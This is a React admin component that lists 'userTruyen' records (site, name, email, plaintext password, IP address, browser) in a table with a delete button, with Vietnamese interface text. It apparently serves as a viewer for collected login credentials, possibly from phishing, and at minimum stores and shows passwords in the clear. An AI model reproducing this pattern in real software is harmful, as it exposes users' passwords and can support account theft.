import { useEffect, useState } from "react";
import { Button, Card, CardBody, Table } from "reactstrap";
import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import {
    // createUserTruyen,
    getUserTruyens,
    deleteUserTruyen,
} from "../services";

const UserTruyen = () => {
    const [userTruyens, setUserTruyens] = useState([]);

    useEffect(() => {
        handleGetUserTruyens();
    }, []);

    const handleGetUserTruyens = async () => {
        try {
            const res = await getUserTruyens();

            setUserTruyens(res.data);
        } catch (error) {
            if (error.response.status === 403) {
                window.alert("Phiên đăng nhập đã hết hạn");

                window.location.href = "/sign-in";
            }

            console.log("Error getDomains: ", error);
        }
    };

    const handleDeleteUserTruyen = async (id) => {
        try {
            const ifConfirm = window.confirm("Xác nhận xoá bản ghi này");

            if (ifConfirm) {
                await deleteUserTruyen(id);

                handleGetUserTruyens();
            }
        } catch (error) {
            if (error.response.status === 403) {
                window.alert("Phiên đăng nhập đã hết hạn");

                window.location.href = "/sign-in";
            }

            console.log("Error deleteUserTruyen: ", error);
        }
    };

    return (
        <div>
            <ToastContainer />

            <Card>
                <CardBody>
                    <Table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Site</th>
                                <th>Name</th>
                                <th>Email</th>
                                <th>Password</th>
                                <th>IP</th>
                                <th>Browser</th>
                                <th></th>
                            </tr>
                        </thead>
                        <tbody>
                            {userTruyens.map((e, i) => {
                                return (
                                    <tr key={e.value}>
                                        <td>{i + 1}</td>
                                        <td>{e.site}</td>
                                        <td>{e.name}</td>
                                        <td>{e.email}</td>
                                        <td>{e.password}</td>
                                        <td>{e.ipAddress}</td>
                                        <td>{e.browserInfo}</td>
                                        <td>
                                            <Button
                                                onClick={() => {
                                                    handleDeleteUserTruyen(e._id);
                                                }}
                                                color="danger"
                                            >
                                                Xoá
                                            </Button>
                                        </td>
                                    </tr>
                                );
                            })}
                        </tbody>
                    </Table>
                </CardBody>
            </Card>
        </div>
    );
};

export default UserTruyen;
